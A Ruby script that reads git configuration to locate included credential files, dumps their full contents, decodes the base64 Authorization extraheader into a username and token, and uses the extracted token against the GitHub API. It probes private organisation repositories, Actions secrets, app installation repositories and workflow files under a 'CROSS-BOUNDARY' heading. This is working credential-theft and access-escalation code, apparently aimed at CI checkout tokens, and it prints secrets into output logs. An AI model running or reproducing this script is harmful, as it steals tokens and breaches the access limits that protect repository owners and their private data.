require 'net/http'
require 'json'
require 'base64'

$stdout.puts "=== FULL CREDENTIAL FILE DUMP ==="

git_config = File.read(".git/config") rescue ""
cred_paths = git_config.scan(/path\s*=\s*(.+)/).flatten.map(&:strip).uniq

cred_paths.each do |p|
  next unless File.exist?(p)
  content = File.read(p)
  $stdout.puts "FILE: #{p} (#{content.length} bytes)"
  content.lines.each_with_index do |line, i|
    $stdout.puts "  L#{i}: #{line.chomp}"
  end
end

$stdout.puts ""
$stdout.puts "=== EXTRAHEADER DECODE ==="

git_config.lines.each do |line|
  $stdout.puts "  gitcfg: #{line.chomp}" if line =~ /include|path|url|extra|auth/i
end

cred_paths.each do |p|
  next unless File.exist?(p)
  content = File.read(p)
  
  content.scan(/AUTHORIZATION:\s*basic\s+(\S+)/i).each do |match|
    b64_value = match[0]
    $stdout.puts ""
    $stdout.puts "RAW base64: length=#{b64_value.length}"
    $stdout.puts "RAW base64 first 20: #{b64_value[0..19]}"
    
    decoded = Base64.decode64(b64_value)
    $stdout.puts "DECODED: length=#{decoded.length}"
    $stdout.puts "DECODED printable: #{decoded.bytes.all? { |b| b >= 32 && b <= 126 }}"
    
    if decoded.include?(":")
      parts = decoded.split(":", 2)
      $stdout.puts "SPLIT[0] (user): #{parts[0]}"
      $stdout.puts "SPLIT[1] (pass): length=#{parts[1]&.length} prefix=#{parts[1]&.slice(0,8)}"
      
      token = parts[1]
      if token && token.length > 10
        $stdout.puts ""
        $stdout.puts "=== API TEST WITH EXTRACTED TOKEN ==="
        
        http = Net::HTTP.new("api.github.com", 443)
        http.use_ssl = true
        
        req = Net::HTTP::Get.new("/repos/github/explore")
        req["Authorization"] = "Bearer #{token}"
        req["Accept"] = "application/vnd.github+json"
        res = http.request(req)
        $stdout.puts "T1 GET /repos/github/explore: #{res.code}"
        $stdout.puts "T1 X-OAuth-Scopes: #{res['X-OAuth-Scopes']}"
        
        req2 = Net::HTTP::Get.new("/repos/github/explore")
        req2["Authorization"] = "token #{token}"
        req2["Accept"] = "application/vnd.github+json"
        res2 = http.request(req2)
        $stdout.puts "T2 GET (token auth): #{res2.code}"
        
        if res.code == "200" || res2.code == "200"
          $stdout.puts ""
          $stdout.puts "=== CROSS-BOUNDARY ==="
          
          r3 = Net::HTTP::Get.new("/repos/github/github")
          r3["Authorization"] = "token #{token}"
          r3["Accept"] = "application/vnd.github+json"
          $stdout.puts "GET /repos/github/github: #{http.request(r3).code}"
          
          r4 = Net::HTTP::Get.new("/orgs/github/repos?type=private&per_page=3")
          r4["Authorization"] = "token #{token}"
          r4["Accept"] = "application/vnd.github+json"
          res4 = http.request(r4)
          $stdout.puts "GET /orgs/github/repos?type=private: #{res4.code}"
          if res4.code == "200"
            JSON.parse(res4.body).each { |r| $stdout.puts "  PRIVATE: #{r['full_name']}" }
          end
          
          r5 = Net::HTTP::Get.new("/repos/github/explore/actions/secrets")
          r5["Authorization"] = "token #{token}"
          r5["Accept"] = "application/vnd.github+json"
          res5 = http.request(r5)
          $stdout.puts "GET secrets: #{res5.code}"
          if res5.code == "200"
            d = JSON.parse(res5.body)
            $stdout.puts "  total: #{d['total_count']}"
            d['secrets']&.each { |s| $stdout.puts "  SECRET: #{s['name']}" }
          end
          
          r6 = Net::HTTP::Get.new("/installation/repositories?per_page=5")
          r6["Authorization"] = "token #{token}"
          r6["Accept"] = "application/vnd.github+json"
          res6 = http.request(r6)
          $stdout.puts "GET /installation/repositories: #{res6.code}"
          if res6.code == "200"
            d6 = JSON.parse(res6.body)
            $stdout.puts "  total: #{d6['total_count']}"
            d6['repositories']&.first(5)&.each { |r| $stdout.puts "  INSTALL: #{r['full_name']} priv=#{r['private']}" }
          end
          
          r7 = Net::HTTP::Get.new("/repos/github/explore/contents/.github/workflows")
          r7["Authorization"] = "token #{token}"
          r7["Accept"] = "application/vnd.github+json"
          res7 = http.request(r7)
          $stdout.puts "GET workflow contents: #{res7.code}"
        end
      end
    else
      $stdout.puts "DECODED no colon, raw bytes: #{decoded.bytes.first(20).inspect}"
    end
  end
end

$stdout.puts "=== END ==="
$stdout.flush